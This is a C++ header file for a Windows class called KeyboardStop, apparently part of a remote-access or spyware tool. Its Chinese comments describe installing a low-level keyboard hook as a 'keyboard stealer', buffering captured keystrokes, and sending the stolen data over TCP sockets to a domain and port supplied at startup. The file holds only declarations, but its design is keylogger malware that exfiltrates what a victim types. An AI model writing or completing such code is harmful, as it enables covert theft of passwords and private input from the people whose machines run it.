#ifndef KEYBOARDSTOP_H
#define KEYBOARDSTOP_H

#include "tcpsocket.h"
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <vector>
#include <QtDebug>

class KeyboardStop
{
public:
    KeyboardStop();
    ~KeyboardStop();

    // 这个类的入口函数
    static void startKeyboardStop(std::string domain, int port);

    // 因为要出里win32数据，
    static void createDialogByNewThread();
    static DWORD WINAPI threadProc(LPVOID args);
    static BOOL CALLBACK WINAPI KeyboardStopWndProc(HWND hWnd,UINT uiMsg, WPARAM wParam,LPARAM lParam);
    static WINBOOL CALLBACK WINAPI shit(HWND hWnd,UINT uiMsg, WPARAM wParam,LPARAM lParam);

    // 键盘数据结构
    typedef struct
    {
        int iCode;
        int iScanCode;
        int iFlags;
        int iTime;
        int iExtraInfo;
    } HookStruct;

    // 安装和移除键盘窃取器，钩子
    static HHOOK installKeyboardHook();
    static void uninstallKeyboardHook(HHOOK hHook);
    static LRESULT CALLBACK keyboardHookProc(int nCode,WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK keyboardHookProcStop(int nCode, WPARAM wParam, LPARAM lParam);

    // 更新或删除，socket，缓冲区
    static void addSocket(TcpSocket *sock);
    static std::vector<TcpSocket*> getSockets();
    static void delSocket(TcpSocket *sock);
    static void addBuffer(char data);
    static void delBuffer();

    // 发送窃取的数据
    static void CALLBACK sendKeyboardData(HWND hWnd,UINT uiMsg,UINT_PTR uiTimer,DWORD dwTimer);
};

#endif // KEYBOARDSTOP_H